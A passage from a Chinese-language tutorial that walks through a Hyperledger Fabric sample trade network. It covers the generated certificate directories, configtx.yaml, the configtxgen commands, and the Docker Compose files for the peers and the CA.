regulatororg.trade.com</span><br></pre></td></tr></table></figure><p>现在以trade.com为例进行展开分析</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">$ tree  crypto-config/ordererOrganizations/trade.com/</span><br><span class="line">crypto-config/ordererOrganizations/trade.com/</span><br><span class="line">├── ca   <span class="comment">## 存放组织根证书及私钥(采用EC算法)证书为【自签名】，组织内的实体将给予该根证书作为证书根</span></span><br><span class="line">│   ├── ca.trade.com-cert.pem  <span class="comment">## 证书CA</span></span><br><span class="line">│   └── d046c897334d539608c5fa578e7686441ec41115702ff8105e22998785839612_sk  <span class="comment">## 私钥</span></span><br><span class="line">├── msp  <span class="comment">## 存放该组织身份信息</span></span><br><span class="line">│   ├── admincerts  <span class="comment">## 组织管理员身份验证证书，【被根证书签名】</span></span><br><span class="line">│   │   └── Admin@trade.com-cert.pem  </span><br><span class="line">│   ├── cacerts     <span class="comment">## 组织的根证书 【和CA目录里面一致】</span></span><br><span class="line">│   │   └── ca.trade.com-cert.pem  </span><br><span class="line">│   └── tlscacerts  <span class="comment">## 用于TLS的CA证书，【自签名】</span></span><br><span class="line">│       └── tlsca.trade.com-cert.pem</span><br><span class="line">├── orderers  <span class="comment">## 存放所有 Orderer 的身份信息</span></span><br><span class="line">│   └── orderer.trade.com   <span class="comment">## 第一个Orderer的信息msp及tls</span></span><br><span class="line">│       ├── msp</span><br><span class="line">│       │   ├── admincerts  <span class="comment">## 组织管理员身份验证证书 </span></span><br><span class="line">│       │   │   └── Admin@trade.com-cert.pem</span><br><span class="line">│       │   ├── cacerts</span><br><span class="line">│       │   │   └── ca.trade.com-cert.pem</span><br><span class="line">│       │   ├── keystore  <span class="comment">## 本节点的身份私钥，用来签名</span></span><br><span class="line">│       │   │   └── 38195f71e2b520910f2a2e405764975e235c7d97ff6a7fde41127e1575888375_sk</span><br><span class="line">│       │   ├── signcerts  <span class="comment">## 验证本节点签名的证书，【被根证书签名】</span></span><br><span class="line">│       │   │   └── orderer.trade.com-cert.pem</span><br><span class="line">│       │   └── tlscacerts  <span class="comment">## TLS连接用的身份证书，【和msp.tlscacerts一致】</span></span><br><span class="line">│       │       └── tlsca.trade.com-cert.pem</span><br><span class="line">│       └── tls  <span class="comment">## tls 的相关信息</span></span><br><span class="line">│           ├── ca.crt   <span class="comment">##【组织的根证书】</span></span><br><span class="line">│           ├── server.crt  <span class="comment">## 验证本节点签名的证书，【被根证书签名】</span></span><br><span class="line">│           └── server.key  <span class="comment">## 本节点的身份私钥，用来签名</span></span><br><span class="line">├── tlsca  <span class="comment">## 存放tls相关的证书和私钥</span></span><br><span class="line">│   ├── acbada48c339b2b60cb9bac3914f359722f37de001628f110792153d8614c443_sk</span><br><span class="line">│   └── tlsca.trade.com-cert.pem</span><br><span class="line">└── users  <span class="comment">##  存放属于该组织的用户的实体</span></span><br><span class="line">    └── Admin@trade.com</span><br><span class="line">        ├── msp</span><br><span class="line">        │   ├── admincerts</span><br><span class="line">        │   │   └── Admin@trade.com-cert.pem</span><br><span class="line">        │   ├── cacerts</span><br><span class="line">        │   │   └── ca.trade.com-cert.pem</span><br><span class="line">        │   ├── keystore</span><br><span class="line">        │   │   └── 2187f9edda98eae3b2169a476e30aff6fb2781c19e6cb400671b723d7b74abde_sk</span><br><span class="line">        │   ├── signcerts</span><br><span class="line">        │   │   └── Admin@trade.com-cert.pem</span><br><span class="line">        │   └── tlscacerts</span><br><span class="line">        │       └── tlsca.trade.com-cert.pem</span><br><span class="line">        └── tls</span><br><span class="line">            ├── ca.crt</span><br><span class="line">            ├── client.crt</span><br><span class="line">            └── client.key</span><br></pre></td></tr></table></figure><p>我们可以知道cryptogen工具无非就是在各个资源下生成组织和私钥、证书等等，其中最关键的就是各个资源下的MSP目录内容：</p><pre><code>admincerts：    管理员的身份证书文件cacerts：       信任的根证书文件keystore：      节点的签名私钥文件signcerts：     节点的签名身份证书文件tlscacerts：    TLS连接用的证书</code></pre><h4 id="3、通道及锚节点的配置-configtx-yaml-配置剖析"><a href="#3、通道及锚节点的配置-configtx-yaml-配置剖析" class="headerlink" title="3、通道及锚节点的配置  configtx.yaml 配置剖析"></a>3、通道及锚节点的配置  configtx.yaml 配置剖析</h4><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">Organizations:</span></span><br><span class="line"><span class="bullet">    -</span> <span class="meta">&amp;TradeOrdererOrg</span></span><br><span class="line"><span class="attr">        Name:</span> <span class="string">TradeOrdererOrg</span> <span class="comment">#Orderer的组织的名称</span></span><br><span class="line"><span class="attr">        ID:</span> <span class="string">TradeOrdererMSP</span>   <span class="comment">#Orderer的组织的ID</span></span><br><span class="line">        <span class="comment"># MSPDir是包含Orderer的MSP证书目录路径</span></span><br><span class="line"><span class="attr">        MSPDir:</span> <span class="string">crypto-config/ordererOrganizations/trade.com/msp</span>  </span><br><span class="line">        </span><br><span class="line"><span class="bullet">    -</span> <span class="meta">&amp;ExporterOrg</span></span><br><span class="line"><span class="attr">        Name:</span> <span class="string">ExporterOrgMSP</span> </span><br><span class="line"><span class="attr">        ID:</span> <span class="string">ExporterOrgMSP</span></span><br><span class="line"><span class="attr">        MSPDir:</span> <span class="string">crypto-config/peerOrganizations/exporterorg.trade.com/msp</span></span><br><span class="line"><span class="attr">        AnchorPeers:</span></span><br><span class="line">            <span class="comment">#锚点定义可以使用的对等节点的位置</span></span><br><span class="line">            <span class="comment">#这些节点用于跨组织的信息交流。注意，这个值只是</span></span><br><span class="line">            <span class="comment">#用来加密应用程序部分上下文的创世区块</span></span><br><span class="line"><span class="attr">            - Host:</span> <span class="string">peer0.exporterorg.trade.com</span>  <span class="comment">##  锚节点的主机名</span></span><br><span class="line"><span class="attr">              Port:</span> <span class="number">7051</span>  <span class="comment">##  锚节点的端口号</span></span><br><span class="line"></span><br><span class="line"><span class="bullet">    -</span> <span class="meta">&amp;ImporterOrg</span></span><br><span class="line"><span class="attr">        Name:</span> <span class="string">ImporterOrgMSP</span></span><br><span class="line"><span class="attr">        ID:</span> <span class="string">ImporterOrgMSP</span></span><br><span class="line"><span class="attr">        MSPDir:</span> <span class="string">crypto-config/peerOrganizations/importerorg.trade.com/msp</span></span><br><span class="line"><span class="attr">        AnchorPeers:</span></span><br><span class="line"><span class="attr">            - Host:</span> <span class="string">peer0.importerorg.trade.com</span></span><br><span class="line"><span class="attr">              Port:</span> <span class="number">7051</span></span><br><span class="line"></span><br><span class="line"><span class="bullet">    -</span> <span class="meta">&amp;CarrierOrg</span></span><br><span class="line"><span class="attr">        Name:</span> <span class="string">CarrierOrgMSP</span></span><br><span class="line"><span class="attr">        ID:</span> <span class="string">CarrierOrgMSP</span></span><br><span class="line"><span class="attr">        MSPDir:</span> <span class="string">crypto-config/peerOrganizations/carrierorg.trade.com/msp</span></span><br><span class="line"><span class="attr">        AnchorPeers:</span></span><br><span class="line"><span class="attr">            - Host:</span> <span class="string">peer0.carrierorg.trade.com</span></span><br><span class="line"><span class="attr">              Port:</span> <span class="number">7051</span></span><br><span class="line"></span><br><span class="line"><span class="bullet">    -</span> <span class="meta">&amp;RegulatorOrg</span></span><br><span class="line"><span class="attr">        Name:</span> <span class="string">RegulatorOrgMSP</span></span><br><span class="line"><span class="attr">        ID:</span> <span class="string">RegulatorOrgMSP</span></span><br><span class="line"><span class="attr">        MSPDir:</span> <span class="string">crypto-config/peerOrganizations/regulatororg.trade.com/msp</span></span><br><span class="line"><span class="attr">        AnchorPeers:</span></span><br><span class="line"><span class="attr">            - Host:</span> <span class="string">peer0.regulatororg.trade.com</span></span><br><span class="line"><span class="attr">              Port:</span> <span class="number">7051</span></span><br><span class="line"></span><br><span class="line"><span class="comment">################################################################################</span></span><br><span class="line"><span class="comment">#   SECTION: Orderer</span></span><br><span class="line"><span class="comment">################################################################################</span></span><br><span class="line"><span class="attr">Orderer:</span> <span class="meta">&amp;OrdererDefaults</span></span><br><span class="line"><span class="attr">    OrdererType:</span> <span class="string">solo</span>   <span class="comment">## Orderer类型，包含solo和kafka集群</span></span><br><span class="line"><span class="attr">    Addresses:</span>   <span class="comment">## 服务地址</span></span><br><span class="line"><span class="bullet">        -</span> <span class="string">orderer.trade.com:7050</span></span><br><span class="line"><span class="attr">    BatchTimeout:</span> <span class="number">2</span><span class="string">s</span> <span class="comment">##  区块打包的最大超时时间 (到了该时间就打包区块)</span></span><br><span class="line"><span class="attr">    BatchSize:</span></span><br><span class="line">        <span class="comment">#一个区块里最大的交易数</span></span><br><span class="line"><span class="attr">        MaxMessageCount:</span> <span class="number">10</span></span><br><span class="line">        <span class="comment"># 一个区块的最大字节数， 任何时候都不能超过</span></span><br><span class="line"><span class="attr">        AbsoluteMaxBytes:</span> <span class="number">99</span> <span class="string">MB</span></span><br><span class="line">        <span class="comment">#一个区块的建议字节数，如果一个交易消息的大小超过了这个值, 就会被放入另外一个更大的区块中</span></span><br><span class="line"><span class="attr">        PreferredMaxBytes:</span> <span class="number">512</span> <span class="string">KB</span></span><br><span class="line"><span class="attr">    Kafka:</span></span><br><span class="line"><span class="attr">        Brokers:</span>  <span class="comment">## kafka的 brokens 服务地址 允许有多个</span></span><br><span class="line"><span class="bullet">            -</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="string">:9092</span></span><br><span class="line"><span class="attr">    Organizations:</span> <span class="comment">##  参与维护 Orderer 的组织，默认为空</span></span><br><span class="line"></span><br><span class="line"><span class="comment">################################################################################</span></span><br><span class="line"><span class="comment">#   SECTION: Application</span></span><br><span class="line"><span class="comment">################################################################################</span></span><br><span class="line"><span class="attr">Application:</span> <span class="meta">&amp;ApplicationDefaults</span> <span class="comment">## 自定义被引用的地址</span></span><br><span class="line"><span class="attr">    Organizations:</span></span><br><span class="line"><span class="comment">################################################################################</span></span><br><span class="line"><span class="comment">#   SECTION: Capabilities</span></span><br><span class="line"><span class="comment">################################################################################</span></span><br><span class="line"><span class="attr">Capabilities:</span></span><br><span class="line"><span class="attr">    Global:</span> <span class="meta">&amp;ChannelCapabilities</span></span><br><span class="line"><span class="attr">        V1_1:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">    Orderer:</span> <span class="meta">&amp;OrdererCapabilities</span></span><br><span class="line"><span class="attr">        V1_1:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">    Application:</span> <span class="meta">&amp;ApplicationCapabilities</span></span><br><span class="line"><span class="attr">        V1_1:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="attr">Profiles:</span></span><br><span class="line"></span><br><span class="line"><span class="attr">    FourOrgsTradeOrdererGenesis:</span></span><br><span class="line"><span class="attr">        Capabilities:</span></span><br><span class="line">            <span class="string">&lt;&lt;:</span> <span class="meta">*ChannelCapabilities</span></span><br><span class="line"><span class="attr">        Orderer:</span></span><br><span class="line">            <span class="string">&lt;&lt;:</span> <span class="meta">*OrdererDefaults</span></span><br><span class="line"><span class="attr">            Organizations:</span></span><br><span class="line"><span class="bullet">                -</span> <span class="meta">*TradeOrdererOrg</span></span><br><span class="line"><span class="attr">            Capabilities:</span></span><br><span class="line">                <span class="string">&lt;&lt;:</span> <span class="meta">*OrdererCapabilities</span></span><br><span class="line"><span class="attr">        Consortiums:</span></span><br><span class="line"><span class="attr">            TradeConsortium:</span></span><br><span class="line"><span class="attr">                Organizations:</span></span><br><span class="line"><span class="bullet">                    -</span> <span class="meta">*ExporterOrg</span></span><br><span class="line"><span class="bullet">                    -</span> <span class="meta">*ImporterOrg</span></span><br><span class="line"><span class="bullet">                    -</span> <span class="meta">*CarrierOrg</span></span><br><span class="line"><span class="bullet">                    -</span> <span class="meta">*RegulatorOrg</span></span><br><span class="line"><span class="attr">    FourOrgsTradeChannel:</span></span><br><span class="line"><span class="attr">        Consortium:</span> <span class="string">TradeConsortium</span></span><br><span class="line"><span class="attr">        Application:</span></span><br><span class="line">            <span class="string">&lt;&lt;:</span> <span class="meta">*ApplicationDefaults</span></span><br><span class="line"><span class="attr">            Organizations:</span></span><br><span class="line"><span class="bullet">                -</span> <span class="meta">*ExporterOrg</span></span><br><span class="line"><span class="bullet">                -</span> <span class="meta">*ImporterOrg</span></span><br><span class="line"><span class="bullet">                -</span> <span class="meta">*CarrierOrg</span></span><br><span class="line"><span class="bullet">                -</span> <span class="meta">*RegulatorOrg</span></span><br><span class="line"><span class="attr">            Capabilities:</span></span><br><span class="line">                <span class="string">&lt;&lt;:</span> <span class="meta">*ApplicationCapabilities</span></span><br></pre></td></tr></table></figure><h4 id="4、通道工件配置channel-artifacts剖析"><a href="#4、通道工件配置channel-artifacts剖析" class="headerlink" title="4、通道工件配置channel-artifacts剖析"></a>4、通道工件配置channel-artifacts剖析</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ configtxgen -profile FourOrgsTradeOrdererGenesis -outputBlock ./channel-artifacts/genesis.block   <span class="comment">##生成创世区块</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ configtxgen -profile FourOrgsTradeChannel -outputCreateChannelTx ./channel-artifacts/channel.tx -channelID tradechannel <span class="comment">## 生成通道配置信息</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ configtxgen -profile FourOrgsTradeChannel -outputAnchorPeersUpdate ./channel-artifacts/ExporterOrgMSPanchors.tx -channelID tradechannel -asOrg ExporterOrgMSP</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ configtxgen -profile FourOrgsTradeChannel -outputAnchorPeersUpdate ./channel-artifacts/ImporterOrgMSPanchors.tx -channelID tradechannel -asOrg ImporterOrgMSP</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ configtxgen -profile FourOrgsTradeChannel -outputAnchorPeersUpdate ./channel-artifacts/CarrierOrgMSPanchors.tx -channelID tradechannel -asOrg CarrierOrgMSP</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ configtxgen -profile FourOrgsTradeChannel -outputAnchorPeersUpdate ./channel-artifacts/RegulatorOrgMSPanchor.tx -channelID tradechannel -asOrg RegulatorORGMSP</span><br></pre></td></tr></table></figure><p>以上命令均包含在./trade.sh中，该脚本还应包含将环境变量FABRIC_CFG_PATH设置为指向包含configtx.yaml文件的文件夹才能使configtxgen工具正常工作。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">export</span> PATH=<span class="variable">$&#123;PWD&#125;</span>/../bin:<span class="variable">$&#123;PWD&#125;</span>:<span class="variable">$PATH</span>   <span class="comment">##配置cryptogen环境变量（前面已配置，此例子无效）</span></span><br><span class="line">$ <span class="built_in">export</span> FABRIC_CFG_PATH=<span class="variable">$&#123;PWD&#125;</span>   <span class="comment">## $&#123;PWD&#125;获取当前目录路径的字符串值</span></span><br></pre></td></tr></table></figure><p>查看channel-artifacts文件夹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ tree channel-artifacts</span><br><span class="line">channel-artifacts/</span><br><span class="line">├── CarrierOrgMSPanchors.tx    <span class="comment">##Carrier组织MSP锚节点配置</span></span><br><span class="line">├── channel.tx                 <span class="comment">##通道配置</span></span><br><span class="line">├── ExporterOrgMSPanchors.tx   <span class="comment">##Exportor组织MSP锚节点配置</span></span><br><span class="line">├── genesis.block              <span class="comment">##创世区块</span></span><br><span class="line">├── ImporterOrgMSPanchors.tx   <span class="comment">##Importer组织MSP锚节点通道配置</span></span><br><span class="line">└── RegulatorOrgMSPanchors.tx  <span class="comment">##Regulator组织MSP锚节点通道配置</span></span><br></pre></td></tr></table></figure><h3 id="四、示例贸易网络分析"><a href="#四、示例贸易网络分析" class="headerlink" title="四、示例贸易网络分析"></a>四、示例贸易网络分析</h3><h4 id="1、相关docker镜像及配置"><a href="#1、相关docker镜像及配置" class="headerlink" title="1、相关docker镜像及配置"></a>1、相关docker镜像及配置</h4><p>hyperledger将该网络运行在三个docker镜像中，在前面的hyperledger fabric环境搭建中已经下拉了这些镜像，可以通过docker命令查看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ docker images |grep hyperledger/fabric-[opc][^co].*[^-]latest</span><br><span class="line">hyperledger/fabric-orderer     latest     <span class="comment">## 用于orderer</span></span><br><span class="line">hyperledger/fabric-peer        latest     <span class="comment">## 用于peer</span></span><br><span class="line">hyperledger/fabric-ca          latest     <span class="comment">## 用于MSP</span></span><br></pre></td></tr></table></figure><p>与docker相关配置文件有三个peer-base.yaml、docker-compose-base.yaml和docker-compose-e2e.yaml，前者是后者的扩展（extends）。</p><h4 id="2、peer-base-yaml配置剖析"><a href="#2、peer-base-yaml配置剖析" class="headerlink" title="2、peer-base.yaml配置剖析"></a>2、peer-base.yaml配置剖析</h4><p>peer-base.yaml在./base 文件夹中，该配置定义了四个peer共同的相关配置</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">services:</span>   <span class="comment">#服务定义 开始标签</span></span><br><span class="line"><span class="attr">  peer-base:</span>   <span class="comment">#服务名</span></span><br><span class="line"><span class="attr">    image:</span> <span class="string">hyperledger/fabric-peer:$IMAGE_TAG</span>   <span class="comment">#docker镜像名</span></span><br><span class="line"><span class="attr">    environment:</span>   <span class="comment">#环境变量</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">CORE_VM_ENDPOINT=unix:///host/var/run/docker.sock</span></span><br><span class="line">      <span class="comment"># the following setting starts chaincode containers on the same</span></span><br><span class="line">      <span class="comment"># bridge network as the peers</span></span><br><span class="line">      <span class="comment"># https://docs.docker.com/compose/networking/</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">CORE_VM_DOCKER_HOSTCONFIG_NETWORKMODE=$&#123;COMPOSE_PROJECT_NAME&#125;_trade</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">CORE_LOGGING_LEVEL=INFO</span>    <span class="comment">#记录信息、警告和错误消息</span></span><br><span class="line">      <span class="comment">#- CORE_LOGGING_LEVEL=DEBUG</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">CORE_PEER_TLS_ENABLED=true</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">CORE_PEER_GOSSIP_USELEADERELECTION=true</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">CORE_PEER_GOSSIP_ORGLEADER=false</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">CORE_PEER_PROFILE_ENABLED=true</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">CORE_PEER_TLS_CERT_FILE=/etc/hyperledger/fabric/tls/server.crt</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">CORE_PEER_TLS_KEY_FILE=/etc/hyperledger/fabric/tls/server.key</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">CORE_PEER_TLS_ROOTCERT_FILE=/etc/hyperledger/fabric/tls/ca.crt</span></span><br><span class="line"><span class="attr">    working_dir:</span> <span class="string">/opt/gopath/src/github.com/hyperledger/fabric/peer</span> <span class="comment">#工作路径</span></span><br><span class="line"><span class="attr">    command:</span> <span class="string">peer</span> <span class="string">node</span> <span class="string">start</span>  <span class="comment">#启动命令</span></span><br></pre></td></tr></table></figure><h4 id="3、docker-compose-base-yaml配置剖析"><a href="#3、docker-compose-base-yaml配置剖析" class="headerlink" title="3、docker-compose-base.yaml配置剖析"></a>3、docker-compose-base.yaml配置剖析</h4><p>docker-compose-base.yaml在./base文件夹中，该配置是每个对等节点具体的配置，以peer0.exporterorg.trade.com为例（其中orderer的配置与peer-base.yaml相似，可参考上面的配置）</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">peer0.exporterorg.trade.com:</span>   <span class="comment">#服务名</span></span><br><span class="line"><span class="attr">    container_name:</span> <span class="string">peer0.exporterorg.trade.com</span>     <span class="comment">#容器名</span></span><br><span class="line"><span class="attr">    extends:</span>  <span class="comment">#扩展配置</span></span><br><span class="line"><span class="attr">      file:</span> <span class="string">peer-base.yaml</span>   <span class="comment">#扩展配置文件</span></span><br><span class="line"><span class="attr">      service:</span> <span class="string">peer-base</span>     <span class="comment">#扩展配置服务</span></span><br><span class="line"><span class="attr">    environment:</span>   <span class="comment">#环境变量</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">CORE_PEER_ID=peer0.exporterorg.trade.com</span>   <span class="comment">#ID与configtx.yaml中相匹配</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">CORE_PEER_ADDRESS=peer0.exporterorg.trade.com:7051</span>  <span class="comment">#地址</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">CORE_PEER_GOSSIP_BOOTSTRAP=peer0.exporterorg.trade.com:7051</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">CORE_PEER_GOSSIP_EXTERNALENDPOINT=peer0.exporterorg.trade.com:7051</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">CORE_PEER_LOCALMSPID=ExporterOrgMSP</span>   <span class="comment">#MSP与configtx.yaml中相匹配</span></span><br><span class="line"><span class="attr">    volumes:</span>   <span class="comment">#挂载卷</span></span><br><span class="line"><span class="bullet">        -</span> <span class="string">/var/run/:/host/var/run/</span></span><br><span class="line"><span class="bullet">        -</span> <span class="string">../crypto-config/peerOrganizations/exporterorg.trade.com/peers/peer0.exporterorg.trade.com/msp:/etc/hyperledger/fabric/msp</span></span><br><span class="line"><span class="bullet">        -</span> <span class="string">../crypto-config/peerOrganizations/exporterorg.trade.com/peers/peer0.exporterorg.trade.com/tls:/etc/hyperledger/fabric/tls</span></span><br><span class="line"><span class="bullet">        -</span> <span class="string">peer0.exporterorg.trade.com:/var/hyperledger/production</span></span><br><span class="line"><span class="attr">    ports:</span>  <span class="comment">#端口映射  host主机端口:容器内端口</span></span><br><span class="line"><span class="bullet">      -</span> <span class="number">7051</span><span class="string">:7051</span>   <span class="comment">#服务器侦听端口</span></span><br><span class="line"><span class="bullet">      -</span> <span class="number">7053</span><span class="string">:7053</span>   <span class="comment">#客户端订阅端口</span></span><br><span class="line"><span class="bullet">      -</span> <span class="number">7055</span><span class="string">:6060</span></span><br></pre></td></tr></table></figure><h4 id="4、docker-compose-e2e-yaml配置剖析"><a href="#4、docker-compose-e2e-yaml配置剖析" class="headerlink" title="4、docker-compose-e2e.yaml配置剖析"></a>4、docker-compose-e2e.yaml配置剖析</h4><p>docker-compose-e2e.yaml，由命令./trade.sh generate -c tradechannel创建，依赖于base / docker-compose-base.yaml（以及间接base / peer-base.yaml），从名为docker-compose-e2e-template.yaml的模板YAML文件创建（同一文件夹）。以exporter-ca为例查看相关MSP配置</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">services:</span>   <span class="comment">#服务定义 开始标签</span></span><br><span class="line"><span class="attr">  exporter-ca:</span>  <span class="comment">#服务名</span></span><br><span class="line"><span class="attr">    image:</span> <span class="string">hyperledger/fabric-ca:$IMAGE_TAG</span>   <span class="comment">#docker镜像</span></span><br><span class="line"><span class="attr">    environment:</span>   <span class="comment">#环境变量</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">FABRIC_CA_HOME=/etc/hyperledger/fabric-ca-server</span>  <span class="comment">#在MSP中运行的服务名</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">FABRIC_CA_SERVER_CA_NAME=ca-exporterorg</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">FABRIC_CA_SERVER_TLS_ENABLED=true</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">FABRIC_CA_SERVER_TLS_CERTFILE=/etc/hyperledger/fabric-ca-server-config/ca.exporterorg.trade.com-cert.pem</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">FABRIC_CA_SERVER_TLS_KEYFILE=/etc/hyperledger/fabric-ca-server-config/6842d1c3a357472cc249fe42d3e97ffe7ba0210ab89781a3fdd73cbc30f8934b_sk</span></span><br><span class="line"><span class="attr">    ports:</span>   <span class="comment">#端口映射  host主机端口:容器内端口</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">"7054:7054"</span></span><br><span class="line"><span class="attr">    command:</span> <span class="string">sh</span> <span class="bullet">-c</span> <span class="string">'fabric-ca-server start --ca.certfile 